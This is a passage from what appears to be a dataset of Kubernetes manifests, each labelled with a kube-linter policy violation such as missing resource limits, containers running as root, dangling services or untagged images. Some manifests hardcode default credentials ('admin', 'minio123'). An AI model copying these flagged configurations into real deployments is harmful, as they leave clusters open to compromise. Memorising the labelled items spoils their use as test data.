akash-hostname-operator-config\n              key: ignore-list-entry-limit\n        - name: AKASH_WEB_REFRESH_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: web-refresh-interval\n        - name: AKASH_RETRY_DELAY\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: retry-delay\n        - name: AKASH_IGNORE_LIST_AGE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-age-limit\n        - name: AKASH_EVENT_FAILURE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: event-failure-limit\n        volumeMounts:\n        - name: boot\n          mountPath: /boot\n          readOnly: true\n      volumes:\n      - name: boot\n        configMap:\n          name: akash-hostname-operator-boot\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"akash-hostname-operator\" has memory limit 0"
  },
  {
    "id": "8267",
    "manifest_path": "data/manifests/the_stack_sample/sample_3074.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: iot-webhook-service\n  namespace: iot\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: 31400\n  selector:\n    app: iot-webhook\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:iot-webhook])"
  },
  {
    "id": "8268",
    "manifest_path": "data/manifests/the_stack_sample/sample_3075.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: package-check-repeat\nspec:\n  template:\n    spec:\n      containers:\n      - name: package-check-repeat\n        image: ubuntu\n        command:\n        - dpkg-query\n        - -l\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8269",
    "manifest_path": "data/manifests/the_stack_sample/sample_3075.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: package-check-repeat\nspec:\n  template:\n    spec:\n      containers:\n      - name: package-check-repeat\n        image: ubuntu\n        command:\n        - dpkg-query\n        - -l\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"package-check-repeat\" is using an invalid container image, \"ubuntu\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8270",
    "manifest_path": "data/manifests/the_stack_sample/sample_3075.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: package-check-repeat\nspec:\n  template:\n    spec:\n      containers:\n      - name: package-check-repeat\n        image: ubuntu\n        command:\n        - dpkg-query\n        - -l\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"package-check-repeat\" does not have a read-only root file system"
  },
  {
    "id": "8271",
    "manifest_path": "data/manifests/the_stack_sample/sample_3075.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: package-check-repeat\nspec:\n  template:\n    spec:\n      containers:\n      - name: package-check-repeat\n        image: ubuntu\n        command:\n        - dpkg-query\n        - -l\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"package-check-repeat\" is not set to runAsNonRoot"
  },
  {
    "id": "8272",
    "manifest_path": "data/manifests/the_stack_sample/sample_3075.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: package-check-repeat\nspec:\n  template:\n    spec:\n      containers:\n      - name: package-check-repeat\n        image: ubuntu\n        command:\n        - dpkg-query\n        - -l\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"package-check-repeat\" has cpu request 0"
  },
  {
    "id": "8273",
    "manifest_path": "data/manifests/the_stack_sample/sample_3075.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: package-check-repeat\nspec:\n  template:\n    spec:\n      containers:\n      - name: package-check-repeat\n        image: ubuntu\n        command:\n        - dpkg-query\n        - -l\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"package-check-repeat\" has memory limit 0"
  },
  {
    "id": "8274",
    "manifest_path": "data/manifests/the_stack_sample/sample_3077.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongo\n  labels:\n    app: mongo\n    component: backend\nspec:\n  ports:\n  - port: 27017\n    targetPort: 27017\n  selector:\n    app: mongo\n    component: backend\n  clusterIP: None\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mongo component:backend])"
  },
  {
    "id": "8275",
    "manifest_path": "data/manifests/the_stack_sample/sample_3079.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/instance: flux-system\n    app.kubernetes.io/version: 0.8.2\n    control-plane: controller\n  name: webhook-receiver\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: http-webhook\n  selector:\n    app: notification-controller\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:notification-controller])"
  },
  {
    "id": "8276",
    "manifest_path": "data/manifests/the_stack_sample/sample_3081.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: headless-service\nspec:\n  clusterIP: None\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "8277",
    "manifest_path": "data/manifests/the_stack_sample/sample_3086.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: hasura\n  namespace: dev\nspec:\n  selector:\n    app: hasura\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:hasura])"
  },
  {
    "id": "8278",
    "manifest_path": "data/manifests/the_stack_sample/sample_3087.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: polardb-catalog-deployment\n  labels:\n    db: polardb-catalog\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      db: polardb-catalog\n  template:\n    metadata:\n      labels:\n        db: polardb-catalog\n    spec:\n      containers:\n      - name: polardb-catalog\n        image: postgres:13\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_USER\n          value: admin\n        - name: POSTGRES_PASSWORD\n          value: admin\n        - name: POSTGRES_DB\n          value: polardb_catalog\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"polardb-catalog\" does not have a read-only root file system"
  },
  {
    "id": "8279",
    "manifest_path": "data/manifests/the_stack_sample/sample_3087.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: polardb-catalog-deployment\n  labels:\n    db: polardb-catalog\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      db: polardb-catalog\n  template:\n    metadata:\n      labels:\n        db: polardb-catalog\n    spec:\n      containers:\n      - name: polardb-catalog\n        image: postgres:13\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_USER\n          value: admin\n        - name: POSTGRES_PASSWORD\n          value: admin\n        - name: POSTGRES_DB\n          value: polardb_catalog\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"polardb-catalog\" is not set to runAsNonRoot"
  },
  {
    "id": "8280",
    "manifest_path": "data/manifests/the_stack_sample/sample_3087.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: polardb-catalog-deployment\n  labels:\n    db: polardb-catalog\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      db: polardb-catalog\n  template:\n    metadata:\n      labels:\n        db: polardb-catalog\n    spec:\n      containers:\n      - name: polardb-catalog\n        image: postgres:13\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_USER\n          value: admin\n        - name: POSTGRES_PASSWORD\n          value: admin\n        - name: POSTGRES_DB\n          value: polardb_catalog\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"polardb-catalog\" has cpu request 0"
  },
  {
    "id": "8281",
    "manifest_path": "data/manifests/the_stack_sample/sample_3087.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: polardb-catalog-deployment\n  labels:\n    db: polardb-catalog\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      db: polardb-catalog\n  template:\n    metadata:\n      labels:\n        db: polardb-catalog\n    spec:\n      containers:\n      - name: polardb-catalog\n        image: postgres:13\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_USER\n          value: admin\n        - name: POSTGRES_PASSWORD\n          value: admin\n        - name: POSTGRES_DB\n          value: polardb_catalog\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"polardb-catalog\" has memory limit 0"
  },
  {
    "id": "8282",
    "manifest_path": "data/manifests/the_stack_sample/sample_3088.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: fuckir89/ui:3.0\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ui\" does not have a read-only root file system"
  },
  {
    "id": "8283",
    "manifest_path": "data/manifests/the_stack_sample/sample_3088.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: fuckir89/ui:3.0\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ui\" is not set to runAsNonRoot"
  },
  {
    "id": "8284",
    "manifest_path": "data/manifests/the_stack_sample/sample_3088.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: fuckir89/ui:3.0\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ui\" has cpu request 0"
  },
  {
    "id": "8285",
    "manifest_path": "data/manifests/the_stack_sample/sample_3088.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: fuckir89/ui:3.0\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ui\" has memory limit 0"
  },
  {
    "id": "8286",
    "manifest_path": "data/manifests/the_stack_sample/sample_3089.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  containers:\n  - name: busybox\n    image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8287",
    "manifest_path": "data/manifests/the_stack_sample/sample_3089.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  containers:\n  - name: busybox\n    image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "8288",
    "manifest_path": "data/manifests/the_stack_sample/sample_3089.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  containers:\n  - name: busybox\n    image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "8289",
    "manifest_path": "data/manifests/the_stack_sample/sample_3089.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  containers:\n  - name: busybox\n    image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "8290",
    "manifest_path": "data/manifests/the_stack_sample/sample_3089.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  containers:\n  - name: busybox\n    image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "8291",
    "manifest_path": "data/manifests/the_stack_sample/sample_3090.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2019-04-18T21-44-59Z\n        args:\n        - server\n        - http://hostname1:9000/data/minio\n        - http://hostname2:9000/data/minio\n        - http://hostname3:9000/data/minio\n        - http://hostname4:9000/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "8292",
    "manifest_path": "data/manifests/the_stack_sample/sample_3090.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2019-04-18T21-44-59Z\n        args:\n        - server\n        - http://hostname1:9000/data/minio\n        - http://hostname2:9000/data/minio\n        - http://hostname3:9000/data/minio\n        - http://hostname4:9000/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "8293",
    "manifest_path": "data/manifests/the_stack_sample/sample_3090.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2019-04-18T21-44-59Z\n        args:\n        - server\n        - http://hostname1:9000/data/minio\n        - http://hostname2:9000/data/minio\n        - http://hostname3:9000/data/minio\n        - http://hostname4:9000/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "8294",
    "manifest_path": "data/manifests/the_stack_sample/sample_3090.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2019-04-18T21-44-59Z\n        args:\n        - server\n        - http://hostname1:9000/data/minio\n        - http://hostname2:9000/data/minio\n        - http://hostname3:9000/data/minio\n        - http://hostname4:9000/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "8295",
    "manifest_path": "data/manifests/the_stack_sample/sample_3090.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2019-04-18T21-44-59Z\n        args:\n        - server\n        - http://hostname1:9000/data/minio\n        - http://hostname2:9000/data/minio\n        - http://hostname3:9000/data/minio\n        - http://hostname4:9000/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "8296",
    "manifest_path": "data/manifests/the_stack_sample/sample_3090.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2019-04-18T21-44-59Z\n        args:\n        - server\n        - http://hostname1:9000/data/minio\n        - http://hostname2:9000/data/minio\n        - http://hostname3:9000/data/minio\n        - http://hostname4:9000/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "8297",
    "manifest_path": "data/manifests/the_stack_sample/sample_3091.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\n  labels:\n    app: frontend\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - backend\n            topologyKey: failure-domain.beta.kubernetes.io/zone\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8298",
    "manifest_path": "data/manifests/the_stack_sample/sample_3091.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\n  labels:\n    app: frontend\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - backend\n            topologyKey: failure-domain.beta.kubernetes.io/zone\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "8299",
    "manifest_path": "data/manifests/the_stack_sample/sample_3091.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\n  labels:\n    app: frontend\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - backend\n            topologyKey: failure-domain.beta.kubernetes.io/zone\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "8300",
    "manifest_path": "data/manifests/the_stack_sample/sample_3091.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\n  labels:\n    app: frontend\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - backend\n            topologyKey: failure-domain.beta.kubernetes.io/zone\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"frontend\" has cpu request 0"
  },
  {
    "id": "8301",
    "manifest_path": "data/manifests/the_stack_sample/sample_3091.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-deployment\n  labels:\n    app: frontend\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - backend\n            topologyKey: failure-domain.beta.kubernetes.io/zone\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"frontend\" has memory limit 0"
  },
  {
    "id": "8302",
    "manifest_path": "data/manifests/the_stack_sample/sample_3093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: knative-serving\n  labels:\n    app: storage-version-migration-serving\n    app.kubernetes.io/name: knative-serving\n    app.kubernetes.io/component: storage-version-migration-job\n    app.kubernetes.io/version: devel\n    serving.knative.dev/release: devel\nspec:\n  ttlSecondsAfterFinished: 600\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: storage-version-migration-serving\n        app.kubernetes.io/name: knative-serving\n        app.kubernetes.io/component: storage-version-migration-job\n        app.kubernetes.io/version: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: migrate\n        image: ko://knative.dev/pkg/apiextensions/storageversion/cmd/migrate\n        args:\n        - services.serving.knative.dev\n        - configurations.serving.knative.dev\n        - revisions.serving.knative.dev\n        - routes.serving.knative.dev\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"migrate\" is using an invalid container image, \"ko://knative.dev/pkg/apiextensions/storageversion/cmd/migrate\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8303",
    "manifest_path": "data/manifests/the_stack_sample/sample_3093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: knative-serving\n  labels:\n    app: storage-version-migration-serving\n    app.kubernetes.io/name: knative-serving\n    app.kubernetes.io/component: storage-version-migration-job\n    app.kubernetes.io/version: devel\n    serving.knative.dev/release: devel\nspec:\n  ttlSecondsAfterFinished: 600\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: storage-version-migration-serving\n        app.kubernetes.io/name: knative-serving\n        app.kubernetes.io/component: storage-version-migration-job\n        app.kubernetes.io/version: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: migrate\n        image: ko://knative.dev/pkg/apiextensions/storageversion/cmd/migrate\n        args:\n        - services.serving.knative.dev\n        - configurations.serving.knative.dev\n        - revisions.serving.knative.dev\n        - routes.serving.knative.dev\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"controller\" not found"
  },
  {
    "id": "8304",
    "manifest_path": "data/manifests/the_stack_sample/sample_3096.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alekseybb/paymentservice:v0.0.2\n        resources: {}\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8305",
    "manifest_path": "data/manifests/the_stack_sample/sample_3096.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alekseybb/paymentservice:v0.0.2\n        resources: {}\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "8306",
    "manifest_path": "data/manifests/the_stack_sample/sample_3096.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alekseybb/paymentservice:v0.0.2\n        resources: {}\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "8307",
    "manifest_path": "data/manifests/the_stack_sample/sample_3096.yaml",
